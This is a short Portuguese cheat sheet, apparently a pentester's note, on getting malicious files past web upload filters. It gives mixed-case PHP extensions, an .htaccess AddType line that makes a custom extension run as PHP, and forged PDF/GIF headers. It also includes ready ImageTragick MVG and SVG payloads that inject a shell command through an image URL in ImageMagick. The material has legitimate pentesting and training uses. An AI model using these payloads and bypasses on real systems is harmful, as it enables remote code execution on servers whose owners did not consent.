# Bypass em regras de extenções para upload  

#### **Aplicação com Case-sensitive ativo**  
Altere algumas letras da extensão para caixa alta:  
**.PHp .pHp .phP**  

#### **Alterando permissões com .htaccess**  
O arquivo .htaccess utilizado em servidores web (geralmente Apache), permite realizar configurações a nível de diretório.  
Podemos criar nosso arquivo malicioso com a extensão  **.sec** e subimos outro arquivo **.htaccess** com a configuração abaixo:  
**AddType application/x-httpd-php .sec**  

#### **Alterando tipo do arquivo**  
Algumas aplicações fazem a validação do tipo de arquivo pelo conteúdo, nesse cado devemos identificar o cabeçalho do arquivo que a aplicação aceita e replicar em nosso arquivo malicioso:

PDF Header
**%PDF-1.5**

GIF Header
**GIF89a**

#### **ImageTragik**  
*https://imagetragick.com/*  

Essa é uma vulnerabilidade encontrada no software ImageMagick muito utilizada por desenvolvedores para tratar imagens enviadas por usuários.
A falha ocorre em formatos de imagens como **.mvg** e **.svg** que utilizam bibliotcas externas para processar o arquivo. Podemos então manipular os links dessas bibliotecas concatenando os comandos que queremos executar:  

**exploit.mvg**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";ls "-la)'
pop graphic-context
```  

**exploit.svg**
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
"http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

Talvez seja necessário alterar o formato do arquivo para .jpg ou .png para dar um bypass em validações de extenção.